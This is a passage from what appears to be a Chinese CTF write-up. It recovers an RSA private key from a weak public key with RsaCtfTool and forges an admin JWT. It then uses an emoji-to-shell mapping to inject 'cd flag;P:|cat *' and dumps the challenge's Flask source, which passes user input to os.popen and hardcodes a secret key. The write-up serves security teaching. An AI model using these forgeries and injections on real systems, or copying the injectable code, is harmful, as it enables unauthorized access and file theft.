class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ICJhJ2EnYSIsICJleHAiOiAxNzMwMjkwMzk2fQ.jkBe0KRjZ6_TtNW3uQNWzrGsr4Pr2ggWDEAKpWnejqU</span><br><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ICJhJ2EnYSIsICJleHAiOiAxNzMwMjkwMzk2fQ.rvVViN0EHtchuMYX0QUclBKFR-WfdlVNYamZLW9bQds</span><br><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ICJhJ2EnYSIsICJleHAiOiAxNzMwMjkwMzk2fQ.LuMruqV8CQnxxqhqc0winF75TxxOmls2rz-ngQOmJtI</span><br><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ICJhJ2EnYSIsICJleHAiOiAxNzMwMjkwMzk2fQ.puJs_mFfBqZuoU7lEI9vf7tJjJILqZFvFzdqt_1GFOw</span><br><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ICJhJ2EnYSIsICJleHAiOiAxNzMwMjkwMzk2fQ.ZPzHChEeiR_G0_gaj3f48NAlCAIEUixa8WlVwYnbzdM</span><br><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ICJhJ2EnYSIsICJleHAiOiAxNzMwMjkwMzk2fQ.SKx5l-8vwmRRmq4CPZ2xU74SwPf8Lc-6ld_igESOWSE</span><br><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ICJhJ2EnYSIsICJleHAiOiAxNzMwMjkwMzk2fQ.0lhQCbytTM-X4WS63btIsNYSKqT5Pc__3dn3Tz-cWtQ</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>然后<code>cat 6eed7ee70f68d654_65537_x509.pem</code>读取里面的公钥</p>
+<p><img src="/../images/20250607185833644.png" alt="image-20250607185833644"></p>
+<p>然后根据公钥生成对应的私钥：<br>项目地址：<a target="_blank" rel="noopener" href="https://github.com/RsaCtfTool/RsaCtfTool">RsaCtfTool&#x2F;RsaCtfTool: RSA attack tool (mainly for ctf) - retrieve private key from weak public key and&#x2F;or uncipher data</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\RsaCtfTool.py --publickey .\publictest2.pem --private</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/20250607190029230.png" alt="image-20250607190029230"></p>
+<p>得到公钥私钥之后就可以进行伪造token了:</p>
+<p><img src="/../images/20250607190113462.png" alt="image-20250607190113462"></p>
+<p>签名有效可以实现伪造 可以成功伪造<code>username</code>为<code>admin</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.DNqIFNdFOWgGGnuk95SQa5GdU_D6TDv95lTU97wUP8ekgqX6zrnvvsnp8XkvVfSx0g3xVQqbo5xhdxjNpM8LiiwX_kQ8FO8t0q0qBn1RJ5O2bGkGOZsUWAUrKg7ME6L4-XFiXi7P328f1t4En_kSp91SeS7-9Lcn7Ja__IJbRuH1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/20250607190156975.png" alt="image-20250607190156975"></p>
+<p>当<code>Username</code>为admin时 可以正常使用功能 GAME</p>
+<p><img src="/../images/20250607190214343.png" alt="image-20250607190214343"></p>
+<p>这也算一个脑洞题了</p>
+<p>小猫🐱 就是 <code>cat</code> 本身 <code>cat *</code>时基本等价于 输出当前目录所有文件</p>
+<p>输入🐱和⭐</p>
+<p><img src="/../images/20250607190538195.png" alt="image-20250607190538195"></p>
+<p>这里注意一下 暗示 flag在 flag.php</p>
+<p>类似的 通过 命令的拼接 可以读取 &#x2F;app&#x2F;flag下源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">💿 🚩😜😐🐱 ⭐</span><br><span class="line">cd flag;P:|cat * </span><br></pre></td></tr></table></figure>
+
+<p>可以读取到 <code>/app/flag</code>的源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, redirect, url_for, flash, session, request, jsonify, make_response</span><br><span class="line"><span class="keyword">from</span> flask_wtf <span class="keyword">import</span> FlaskForm</span><br><span class="line"><span class="keyword">from</span> wtforms <span class="keyword">import</span> StringField, PasswordField, SubmitField, FileField, TextAreaField</span><br><span class="line"><span class="keyword">from</span> wtforms.validators <span class="keyword">import</span> DataRequired, Length</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> authlib.jose <span class="keyword">import</span> jwt, JoseError</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;36f8efbea152e50b23290e0ed707b4b0&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/app/flag/private_key.pem&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    private_key = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/app/flag/public_key.pem&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    public_key = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">game_play</span>(<span class="params">user_input</span>):</span><br><span class="line">    emoji_table = &#123;</span><br><span class="line">        <span class="string">&quot;😀&quot;</span>: <span class="string">&quot;:D&quot;</span>,</span><br><span class="line">        <span class="string">&quot;😉&quot;</span>: <span class="string">&quot;;)&quot;</span>,</span><br><span class="line">        <span class="string">&quot;😊&quot;</span>: <span class="string">&quot;:)&quot;</span>,</span><br><span class="line">        <span class="string">&quot;😋&quot;</span>: <span class="string">&quot;:P&quot;</span>,</span><br><span class="line">        <span class="string">&quot;😎&quot;</span>: <span class="string">&quot;B)&quot;</span>,</span><br><span class="line">        <span class="string">&quot;🤔&quot;</span>: <span class="string">&quot;:?&quot;</span>,</span><br><span class="line">        <span class="string">&quot;😐&quot;</span>: <span class="string">&quot;:|&quot;</span>,</span><br><span class="line">        <span class="string">&quot;😥&quot;</span>: <span class="string">&quot;:&#x27;(&quot;</span>,</span><br><span class="line">        <span class="string">&quot;😮&quot;</span>: <span class="string">&quot;:o&quot;</span>,</span><br><span class="line">        <span class="string">&quot;🤐&quot;</span>: <span class="string">&quot;:x&quot;</span>,</span><br><span class="line">        <span class="string">&quot;😯&quot;</span>: <span class="string">&quot;:o&quot;</span>,</span><br><span class="line">        <span class="string">&quot;😪&quot;</span>: <span class="string">&quot;:&#x27;(&quot;</span>,</span><br><span class="line">        <span class="string">&quot;😫&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,</span><br><span class="line">        <span class="string">&quot;😴&quot;</span>: <span class="string">&quot;Zzz&quot;</span>,</span><br><span class="line">        <span class="string">&quot;😜&quot;</span>: <span class="string">&quot;;P&quot;</span>,</span><br><span class="line">        <span class="string">&quot;😝&quot;</span>: <span class="string">&quot;XP&quot;</span>,</span><br><span class="line">        <span class="string">&quot;😒&quot;</span>: <span class="string">&quot;:/&quot;</span>,</span><br><span class="line">        <span class="string">&quot;🙃&quot;</span>: <span class="string">&quot;(:&quot;</span>,</span><br><span class="line">        <span class="string">&quot;😲&quot;</span>: <span class="string">&quot;:O&quot;</span>,</span><br><span class="line">        <span class="string">&quot;☹️&quot;</span>: <span class="string">&quot;:(&quot;</span>,</span><br><span class="line">        <span class="string">&quot;🙁&quot;</span>: <span class="string">&quot;:(&quot;</span>,</span><br><span class="line">        <span class="string">&quot;😖&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,</span><br><span class="line">        <span class="string">&quot;😞&quot;</span>: <span class="string">&quot;:(&quot;</span>,</span><br><span class="line">        <span class="string">&quot;😤&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,</span><br><span class="line">        <span class="string">&quot;😢&quot;</span>: <span class="string">&quot;:&#x27;(&quot;</span>,</span><br><span class="line">        <span class="string">&quot;😦&quot;</span>: <span class="string">&quot;:(&quot;</span>,</span><br><span class="line">        <span class="string">&quot;😰&quot;</span>: <span class="string">&quot;:(&quot;</span>,</span><br><span class="line">        <span class="string">&quot;😱&quot;</span>: <span class="string">&quot;:O&quot;</span>,</span><br><span class="line">        <span class="string">&quot;🤪&quot;</span>: <span class="string">&quot;:P&quot;</span>,</span><br><span class="line">        <span class="string">&quot;😵&quot;</span>: <span class="string">&quot;X(&quot;</span>,</span><br><span class="line">        <span class="string">&quot;🥴&quot;</span>: <span class="string">&quot;:P&quot;</span>,</span><br><span class="line">        <span class="string">&quot;😠&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,</span><br><span class="line">        <span class="string">&quot;😡&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,</span><br><span class="line">        <span class="string">&quot;🤕&quot;</span>: <span class="string">&quot;:(&quot;</span>,</span><br><span class="line">        <span class="string">&quot;🤢&quot;</span>: <span class="string">&quot;X(&quot;</span>,</span><br><span class="line">        <span class="string">&quot;🤮&quot;</span>: <span class="string">&quot;:P&quot;</span>,</span><br><span class="line">        <span class="string">&quot;🤧&quot;</span>: <span class="string">&quot;:&#x27;(&quot;</span>,</span><br><span class="line">        <span class="string">&quot;😇&quot;</span>: <span class="string">&quot;O:)&quot;</span>,</span><br><span class="line">        <span class="string">&quot;🥳&quot;</span>: <span class="string">&quot;:D&quot;</span>,</span><br><span class="line">        <span class="string">&quot;🥺&quot;</span>: <span class="string">&quot;:&#x27;(&quot;</span>,</span><br><span class="line">        <span class="string">&quot;🤡&quot;</span>: <span class="string">&quot;:o)&quot;</span>,</span><br><span class="line">        <span class="string">&quot;🤠&quot;</span>: <span class="string">&quot;Y)&quot;</span>,</span><br><span class="line">        <span class="string">&quot;🤥&quot;</span>: <span class="string">&quot;:L&quot;</span>,</span><br><span class="line">        <span class="string">&quot;🐶&quot;</span>: <span class="string">&quot;dog&quot;</span>,</span><br><span class="line">        <span class="string">&quot;🐱&quot;</span>: <span class="string">&quot;cat&quot;</span>,</span><br><span class="line">        <span class="string">&quot;🐭&quot;</span>: <span class="string">&quot;mouse&quot;</span>,</span><br><span class="line">        <span class="string">&quot;🐰&quot;</span>: <span class="string">&quot;rabbit&quot;</span>,</span><br><span class="line">        <span class="string">&quot;🦊&quot;</span>: <span class="string">&quot;fox&quot;</span>,</span><br><span class="line">        <span class="string">&quot;🐷&quot;</span>: <span class="string">&quot;pig&quot;</span>,</span><br><span class="line">        <span class="string">&quot;🐽&quot;</span>: <span class="string">&quot;pig nose&quot;</span>,</span><br><span class="line">        <span class="string">&quot;🐸&quot;</span>: <span class="string">&quot;frog&quot;</span>,</span><br><span class="line">        <span class="string">&quot;🐒&quot;</span>: <span class="string">&quot;monkey&quot;</span>,</span><br><span class="line">        <span class="string">&quot;🐔&quot;</span>: <span class="string">&quot;chicken&quot;</span>,</span><br><span class="line">        <span class="string">&quot;🐧&quot;</span>: <span class="string">&quot;penguin&quot;</span>,</span><br><span class="line">        <span class="string">&quot;🐦&quot;</span>: <span class="string">&quot;bird&quot;</span>,</span><br><span class="line">        <span class="string">&quot;🚗&quot;</span>: <span class="string">&quot;car&quot;</span>,</span><br><span class="line">        <span class="string">&quot;🚕&quot;</span>: <span class="string">&quot;taxi&quot;</span>,</span><br><span class="line">        <span class="string">&quot;🚁&quot;</span>: <span class="string">&quot;helicopter&quot;</span>,</span><br><span class="line">        <span class="string">&quot;🛶&quot;</span>: <span class="string">&quot;canoe&quot;</span>,</span><br><span class="line">        <span class="string">&quot;⛵&quot;</span>: <span class="string">&quot;sailboat&quot;</span>,</span><br><span class="line">        <span class="string">&quot;🚤&quot;</span>: <span class="string">&quot;speedboat&quot;</span>,</span><br><span class="line">        <span class="string">&quot;🛳️&quot;</span>: <span class="string">&quot;passenger ship&quot;</span>,</span><br><span class="line">        <span class="string">&quot;⛴️&quot;</span>: <span class="string">&quot;ferry&quot;</span>,</span><br><span class="line">        <span class="string">&quot;🛥️&quot;</span>: <span class="string">&quot;motor boat&quot;</span>,</span><br><span class="line">        <span class="string">&quot;🚢&quot;</span>: <span class="string">&quot;ship&quot;</span>,</span><br><span class="line">        <span class="string">&quot;👶&quot;</span>: <span class="string">&quot;baby&quot;</span>,</span><br><span class="line">        <span class="string">&quot;💿&quot;</span>: <span class="string">&quot;CD&quot;</span>,</span><br><span class="line">        <span class="string">&quot;📀&quot;</span>: <span class="string">&quot;DVD&quot;</span>,</span><br><span class="line">        <span class="string">&quot;📱&quot;</span>: <span class="string">&quot;phone&quot;</span>,</span><br><span class="line">        <span class="string">&quot;💻&quot;</span>: <span class="string">&quot;laptop&quot;</span>,</span><br><span class="line">        <span class="string">&quot;⏰&quot;</span>: <span class="string">&quot;alarm clock&quot;</span>,</span><br><span class="line">        <span class="string">&quot;🕰️&quot;</span>: <span class="string">&quot;mantelpiece clock&quot;</span>,</span><br><span class="line">        <span class="string">&quot;⌚&quot;</span>: <span class="string">&quot;watch&quot;</span>,</span><br><span class="line">        <span class="string">&quot;📡&quot;</span>: <span class="string">&quot;satellite antenna&quot;</span>,</span><br><span class="line">        <span class="string">&quot;🔋&quot;</span>: <span class="string">&quot;battery&quot;</span>,</span><br><span class="line">        <span class="string">&quot;🔌&quot;</span>: <span class="string">&quot;plug&quot;</span>,</span><br><span class="line">        <span class="string">&quot;🚩&quot;</span>: <span class="string">&quot;flag&quot;</span>,</span><br><span class="line">        <span class="string">&quot;⭐&quot;</span>: <span class="string">&quot;*&quot;</span>,</span><br><span class="line">        <span class="string">&quot;✖️&quot;</span>: <span class="string">&quot;×&quot;</span>,</span><br><span class="line">        <span class="string">&quot;➗&quot;</span>: <span class="string">&quot;÷&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">set</span>(user_input).intersection(<span class="built_in">set</span>(string.printable.replace(<span class="string">&quot; &quot;</span>, <span class="string">&#x27;&#x27;</span>)))) &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> user_input.lower()</span><br><span class="line">    command = user_input</span><br><span class="line">    result = <span class="string">&#x27;emoji shell&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> emoji_table:</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">in</span> command:</span><br><span class="line">            command = command.replace(key, emoji_table[key]).lower()</span><br><span class="line">            result = command</span><br><span class="line">            result = result + os.popen(command + <span class="string">&quot; 2&gt;&amp;1&quot;</span>).read()</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LoginForm</span>(<span class="title class_ inherited__">FlaskForm</span>):</span><br><span class="line">    username = StringField(<span class="string">&#x27;Username&#x27;</span>, validators=[DataRequired(), Length(<span class="built_in">min</span>=<span class="number">1</span>, <span class="built_in">max</span>=<span class="number">25</span>)])</span><br><span class="line">    password = PasswordField(<span class="string">&#x27;Password&#x27;</span>, validators=[DataRequired()])</span><br><span class="line">    submit = SubmitField(<span class="string">&#x27;Login&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UploadForm</span>(<span class="title class_ inherited__">FlaskForm</span>):</span><br><span class="line">    avatar = FileField(<span class="string">&#x27;Choose a file&#x27;</span>, validators=[DataRequired()])</span><br><span class="line">    submit = SubmitField(<span class="string">&#x27;Upload&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">GameForm</span>(<span class="title class_ inherited__">FlaskForm</span>):</span><br><span class="line">    user_input = TextAreaField(<span class="string">&#x27;Enter something&#x27;</span>, validators=[DataRequired()])</span><br><span class="line">    submit = SubmitField(<span class="string">&#x27;Submit&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_jwt</span>(<span class="params">username</span>):</span><br><span class="line">    header = &#123;<span class="string">&#x27;alg&#x27;</span>: <span class="string">&#x27;RS256&#x27;</span>&#125;</span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">    &#125;</span><br><span class="line">    token = jwt.encode(header, payload, private_key)</span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_jwt</span>(<span class="params">token</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = jwt.decode(token, public_key)</span><br><span class="line">        <span class="keyword">return</span> payload</span><br><span class="line">    <span class="keyword">except</span> JoseError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    form = LoginForm()</span><br><span class="line">    <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">        username = form.username.data</span><br><span class="line">        password = form.password.data</span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">            flash(<span class="string">&#x27;Invalid username or password&#x27;</span>, <span class="string">&#x27;danger&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>, form=form)</span><br><span class="line">        <span class="keyword">if</span> username:</span><br><span class="line">            session[<span class="string">&#x27;role&#x27;</span>] = <span class="string">&#x27;guest&#x27;</span></span><br><span class="line">            token = generate_jwt(username)</span><br><span class="line">            response = make_response(redirect(url_for(<span class="string">&#x27;dashboard&#x27;</span>)))</span><br><span class="line">            response.set_cookie(<span class="string">&#x27;token&#x27;</span>, token.decode())</span><br><span class="line">            flash(<span class="string">&#x27;Login successful!&#x27;</span>, <span class="string">&#x27;success&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flash(<span class="string">&#x27;Invalid username or password&#x27;</span>, <span class="string">&#x27;danger&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>, form=form)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/dashboard&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dashboard</span>():</span><br><span class="line">    token = request.cookies.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">        flash(<span class="string">&#x27;Please login first&#x27;</span>, <span class="string">&#x27;warning&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    payload = decode_jwt(token)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> payload:</span><br><span class="line">        flash(<span class="string">&#x27;Invalid or expired token. Please login again.&#x27;</span>, <span class="string">&#x27;danger&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;dashboard.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/profile&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">profile</span>():</span><br><span class="line">    token = request.cookies.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">        flash(<span class="string">&#x27;Please login first&#x27;</span>, <span class="string">&#x27;warning&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    payload = decode_jwt(token)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> payload:</span><br><span class="line">        flash(<span class="string">&#x27;Invalid or expired token. Please login again.&#x27;</span>, <span class="string">&#x27;danger&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    user_info = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: payload[<span class="string">&#x27;username&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;role&#x27;</span>: session[<span class="string">&#x27;role&#x27;</span>],</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;profile.html&#x27;</span>, user_info=user_info)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/game&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">game</span>():</span><br><span class="line">    token = request.cookies.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">    form = GameForm()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">        error_message = <span class="string">&#x27;Please login first&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;game.html&#x27;</span>, form=form, error_message=error_message)</span><br><span class="line">    payload = decode_jwt(token)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> payload:</span><br><span class="line">        error_message = <span class="string">&#x27;Invalid or expired token. Please login again.&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;game.html&#x27;</span>, form=form, error_message=error_message)</span><br><span class="line">    <span class="keyword">if</span> payload[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        error_message = <span class="string">&#x27;You do not have permission to access this page. Your username is not admin&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;game.html&#x27;</span>, form=form, error_message=error_message)</span><br><span class="line">    user_input = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">        user_input = form.user_input.data</span><br><span class="line">        user_input = game_play(user_input)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;game.html&#x27;</span>, form=form, user_input=user_input)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    token = request.cookies.get(<span 